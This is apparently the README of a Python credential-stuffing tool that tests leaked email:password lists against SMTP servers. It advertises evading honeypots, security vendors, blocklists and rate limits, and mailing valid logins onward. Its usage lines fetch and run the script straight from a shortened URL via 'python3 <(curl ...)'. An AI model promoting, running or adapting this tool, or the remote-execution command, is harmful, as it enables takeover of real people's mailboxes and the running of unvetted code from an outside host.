# mailpass2smtp.py - MadCat proxyless mail:pass and SMTP bruter/cracker/checker
![image](https://user-images.githubusercontent.com/1212294/193923021-dea15258-d74f-43e7-aa2e-4d33b89704a4.png)

SMTP checker, that takes list, containing emails & passwords, in any order and in any format, extract email & password, recover connection params and trying to login with these credentials.
## Features
- __don't require proxy lists__, at all
- takes as input literaly anything - __csv lists, sql dumps, json exports, text with any garbage__ inside. Accepting files up to 100Gb in size, still keeping memory footprint low.
- detects and skips __60+ topmost known honeypots__ and __80+% of unknown honeypots__, keeping you away from abuse reports.
- skips emails, hosted by all known security vendors (like __proofpoint, perimeterwatch, securence, techtarget, cisco__ etc.), to keep you away from abuses.
- __prefering ipv6__ over ipv4 to evade spam-house ip blocking.
- trying __qa-__ nodes first, where bruteforse protection is often disabled.
- trying to connect to __different geo-separated host nodes__ of mail servers in balancer pool, if any.
- custom DNS resolver, to connect to __different ip every time__. To evade bruteforse protection.
- __trying neighbor ips__, if server on current ip rate-limiting us.
- skips email providers, where login:password authorization (unsafe apps) is desabled by default (like mail.ru, gmail etc.)
- automaticaly __adjusts ulimit__ values, to keep you runnig as fast as possible.
- automatical threads count balancing.
- can email you with valid credentials, if you provide an email, for further inbox sorting.
- can probe around __~150 credential pairs per second__ (~300-500 in "rage" mode)
- you can resume scan from any line you want

## Setup
All you need is __python3__ and __psutil & dnspython__ modules installed (script will try to install missing modules by itself, anyway).
On CentOS you may need to install missing modules by hand:
```
sudo yum install python-devel
sudo yum install python-requests
sudo yum install python-psutil
sudo yum install python-dns
```
## Usage
```
python3 <(curl -slkSL is.gd/madcatsmtp) list.txt [verify_email@example.com] [ignored,email,domains] [start_from_line] [rage]
```
where:
- __list.txt__ is path to your combo list, or dump, or csv etc.
- __verify_email@example.com__ is email, where to mail valid results (optional).
- __ignored,email,domains__ is a comma-separated list of skipped email providers in addition to built-in one (optional).
- __start_from_line__ is just a line number to start from, if any (optional).
- __rage__ is a keyword, by adding which you will increase threads number from 300 to 600, which in case of small server will cause instabilities (optional).

\*good credential pairs will be saved to __original_file_name\_smtp.txt__.

Or just:
```
python3 <(curl -slkSL is.gd/madcatsmtp)
```
and you will be prompted for missing parameters.


Good luck.
